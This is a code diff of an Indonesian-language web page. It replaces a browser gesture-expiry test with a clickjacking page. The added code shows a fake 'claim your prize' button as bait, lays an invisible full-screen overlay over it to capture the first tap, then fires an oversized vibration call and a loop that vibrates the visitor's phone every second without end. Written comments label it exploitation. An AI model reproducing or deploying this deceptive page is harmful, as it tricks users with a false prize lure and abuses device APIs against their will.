@@ -1,135 +1,126 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uji Coba Bug: Async Gesture Expiry Bypass</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            padding: 20px;
-            background-color: #f4f6f9;
-            color: #333;
-            text-align: center;
-        }
-        .container {
-            max-width: 400px;
-            margin: 50px auto;
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-        }
-        button {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            transition: background 0.2s;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-        #status-log {
-            margin-top: 20px;
-            padding: 15px;
-            background: #222;
-            color: #00ff00;
-            font-family: monospace;
-            text-align: left;
-            border-radius: 6px;
-            font-size: 12px;
-            min-height: 100px;
-            white-space: pre-wrap;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Clickjacking & Haptic Experiment</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+  body { 
+    background: #121214; 
+    color: #ffffff; 
+    min-height: 100vh; 
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    overflow: hidden;
+  }
+
+  /* LAPISAN 1: Umpan Visual (Yang Dilihat Pengguna) */
+  .game-layer {
+    position: absolute;
+    top: 0; left: 0; width: 100%; height: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    z-index: 1;
+    text-align: center;
+  }
+  .fake-btn {
+    margin-top: 20px;
+    background: #007bff;
+    color: white;
+    padding: 15px 40px;
+    font-size: 18px;
+    font-weight: bold;
+    border-radius: 50px;
+    box-shadow: 0 4px 15px rgba(0,123,255,0.4);
+    animation: pulse 1.5s infinite;
+  }
+
+  /* LAPISAN 2: Clickjacking Invisible Overlay (Yang Mengeksekusi Getar) */
+  /* Lapisan ini menutupi seluruh layar secara transparan di atas game-layer */
+  .invisible-overlay {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: transparent;
+    opacity: 0; /* Sepenuhnya tidak terlihat */
+    z-index: 999; /* Berada paling atas agar mendahului semua ketukan */
+    cursor: pointer;
+  }
+
+  #status-log {
+    margin-top: 30px;
+    font-family: monospace;
+    font-size: 11px;
+    color: #00ff66;
+    background: #000;
+    padding: 10px;
+    border-radius: 5px;
+    width: 80%;
+    max-width: 300px;
+    text-align: left;
+    min-height: 60px;
+  }
+
+  @keyframes pulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.05); }
+    100% { transform: scale(1); }
+  }
+</style>
 </head>
 <body>
 
-<div class="container">
-    <h2>Browser Gesture Test</h2>
-    <p>Gunakan tombol di bawah untuk menguji apakah browser Android Anda rentan terhadap <i>Async Expiry Bypass</i>.</p>
+  <!-- Lapisan Umpan Psiko/Game -->
+  <div class="game-layer">
+    <h2>Klaim Hadiah Anda!</h2>
+    <p style="color: #aaa; margin-top: 5px; font-size: 14px;">Ketuk tombol di bawah untuk membuka hadiah.</p>
+    <div class="fake-btn">KLAIM SEKARANG</div>
     
-    <!-- Tombol Pemicu Utama -->
-    <button id="testBtn">Mulai Pengujian (Klik 1x)</button>
+    <div id="status-log">> Menunggu interaksi pengguna...</div>
+  </div>
 
-    <h3>Konsol Log Logika:</h3>
-    <div id="status-log">Menunggu klik dari Anda...</div>
-</div>
+  <!-- Lapisan Clickjacking Transparan -->
+  <div class="invisible-overlay" id="victim-trigger"></div>
 
 <script>
-    const logBox = document.getElementById('status-log');
-    const testBtn = document.getElementById('testBtn');
+(function() {
+  var trigger = document.getElementById('victim-trigger');
+  var logBox = document.getElementById('status-log');
+  var loopInterval = null;
 
-    // Fungsi pembantu untuk mencetak log ke layar HP
-    function writeLog(text) {
-        logBox.innerHTML += "\n> " + text;
-        console.log(text);
+  function writeLog(text) {
+    logBox.innerHTML = "> " + text;
+  }
+
+  // Begitu pengguna mengetuk bagian mana saja di layar (karena terhalang overlay transparan)
+  trigger.addEventListener('click', function(e) {
+    writeLog("Gesture terdeteksi! Token akses aktif.");
+
+    if (navigator.vibrate) {
+      // 1. Eksekusi getaran angka raksasa instan memanfaatkan token yang aktif
+      navigator.vibrate(999999999999999999);
+
+      // 2. Eksploitasi Rantai Loop (Menjaga getaran tetap hidup selamanya)
+      if (loopInterval === null) {
+        loopInterval = setInterval(function() {
+          // Memompa getaran pendek konstan setiap 1 detik
+          navigator.vibrate(500);
+        }, 1000);
+        writeLog("🚨 GETAR LOOP AKTIF BERKELANJUTAN!");
+      }
+    } else {
+      writeLog("Browser tidak mendukung haptik.");
     }
 
-    // Fungsi simulasi jeda waktu asinkron murni menggunakan Promise
-    function sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
+    // Menghilangkan overlay setelah klik pertama agar pengguna bisa berinteraksi dengan web asli di bawahnya
+    trigger.style.display = 'none';
+  });
 
-    testBtn.addEventListener('click', async () => {
-        logBox.innerHTML = ""; // Bersihkan log lama
-        writeLog("Tombol diklik. Token 'User Activation' aktif.");
-        writeLog("Memulai jeda asinkron berantai (Total: 6 detik)...");
-
-        // MENYIMPAN STATUS AKTIVASI SEBELUM DELAY (Untuk pengecekan internal)
-        if (navigator.userActivation) {
-            writeLog("Status Aktivasi Awal: " + navigator.userActivation.isActive);
-        }
-
-        // Trik Ekstraksi: Melakukan operasi asinkron bertingkat (Nested Promises)
-        // Di sini kita memaksa browser menunggu total 6 detik.
-        // Di browser yang aman, token interaksi HARUSNYA hangus setelah maksimal 5 detik.
-        await sleep(3000);
-        writeLog("...Sudah berjalan 3 detik...");
-        await sleep(3000);
-        writeLog("...Sudah berjalan 6 detik. Delay Selesai.");
-
-        if (navigator.userActivation) {
-            writeLog("Status Aktivasi Sekarang: " + navigator.userActivation.isActive);
-        }
-
-        writeLog("Mencoba mengeksekusi Fullscreen & Getar secara ilegal...");
-
-        // 1. UJI COBA BYPASS FULLSCREEN
-        try {
-            if (document.documentElement.requestFullscreen) {
-                await document.documentElement.requestFullscreen();
-            } else if (document.documentElement.webkitRequestFullscreen) {
-                await document.documentElement.webkitRequestFullscreen();
-            }
-            writeLog("🚨 BUG COMFIRMED: Sukses tembus Fullscreen setelah 6 detik!");
-        } catch (err) {
-            writeLog("❌ Fullscreen diblokir (Perilaku Normal).");
-        }
-
-        // 2. UJI COBA BYPASS VIBRATE (GETAR)
-        try {
-            if (navigator.vibrate) {
-                // Mencoba menggetarkan HP selama 2 detik
-                let success = navigator.vibrate(999999999999999999);
-                if (success) {
-                    writeLog("🚨 BUG COMFIRMED: HP Anda bergetar tanpa gesture langsung!");
-                } else {
-                    writeLog("❌ Getar ditolak atau gagal.");
-                }
-            } else {
-                writeLog("ℹ️ Browser tidak mendukung API Getar.");
-            }
-        } catch (err) {
-            writeLog("❌ Gagal mengeksekusi Getar: " + err.message);
-        }
-    });
+})();
 </script>
 
 </body>
